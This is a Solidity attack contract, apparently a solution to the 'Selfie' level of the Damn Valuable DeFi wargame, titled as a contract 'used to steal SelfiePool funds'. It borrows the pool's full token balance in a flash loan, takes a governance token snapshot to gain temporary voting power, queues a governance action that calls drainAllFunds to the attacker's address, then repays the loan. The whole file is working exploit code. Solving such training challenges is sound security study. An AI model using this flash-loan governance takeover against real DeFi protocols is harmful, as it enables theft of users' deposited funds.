// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

/**
 * @title Contract used to steal SelfiePool funds
 */
contract AttackSelfie {

    address attacker;
    SelfiePool pool;
    SimpleGovernance governance;
    constructor(address _attacker, SelfiePool _pool, SimpleGovernance _governance) {
        attacker = _attacker;
        pool = _pool;
        governance = _governance;
    }

    function triggerFlashLoan() external {
        pool.flashLoan(pool.token().balanceOf(address(pool)));
    }

    function receiveTokens(address token, uint borrowAmount) external {
        DamnValuableTokenSnapshot(token).snapshot(); // Needed to pass _hasEnoughVotes in SimpleGovernance
        governance.queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)", attacker), 0);
        pool.token().transfer(address(pool), borrowAmount);
    }
    
}